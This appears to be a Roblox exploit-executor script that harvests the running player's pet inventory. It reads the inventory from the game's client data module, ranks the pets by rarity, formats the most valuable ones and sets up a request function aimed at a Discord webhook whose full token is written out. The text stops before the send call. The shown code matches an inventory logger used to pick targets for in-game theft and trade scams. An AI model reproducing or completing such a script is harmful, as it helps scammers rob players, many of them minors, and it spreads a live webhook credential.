local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local lp = Players.LocalPlayer

-- 🔥 PROXY WEBHOOK
local webhook = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"

-- executor
local executor =
    (identifyexecutor and identifyexecutor()) or
    (getexecutorname and getexecutorname()) or
    "Unknown"

-- request
local req =
    (syn and syn.request) or
    (http and http.request) or
    (http_request) or
    (request)

if not req then
    warn("No request function")
    return
end

-- =========================
-- 🐶 GET PETS (FIXED)
-- =========================
local pets = {}

local success, clientData = pcall(function()
    return require(ReplicatedStorage.ClientModules.Core.ClientData)
end)

if success and clientData then
    local data = clientData.get_data()[tostring(lp)]

    if data and data.inventory and data.inventory.pets then
        for _, pet in pairs(data.inventory.pets) do
            table.insert(pets, {
                name = pet.id or "Unknown",
                rarity = (pet.rarity or "common"):lower()
            })
        end
    end
end

-- =========================
-- 💰 TEMP VALUE SYSTEM
-- =========================
local rarityValue = {
    legendary = 5,
    ultra_rare = 4,
    rare = 3,
    uncommon = 2,
    common = 1
}

for _, pet in pairs(pets) do
    pet.value = rarityValue[pet.rarity] or 0
end

table.sort(pets, function(a, b)
    return a.value > b.value
end)

-- =========================
-- 📦 FORMAT (CLEAN STYLE)
-- =========================
local function formatPets(pets)
    local lines = {}

    for i, pet in ipairs(pets) do
        if i > 12 then break end

        local emoji = {
            legendary = "🟡",
            ultra_rare = "🟣",
            rare = "🔵",
            uncommon = "🟢",
            common = "⚪"
        }

        local icon = emoji[pet.rarity] or "❓"

        table.insert(lines,
            string.format("%s %s", icon, pet.name)
        )
    end

    if #lines == 0 then
        return "No pets detected"
    end

    return table.concat(lines, "\n")
end

local petList = formatPets(pets)

-- =========================
-- 📊 INFO
-- =========================
local playerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

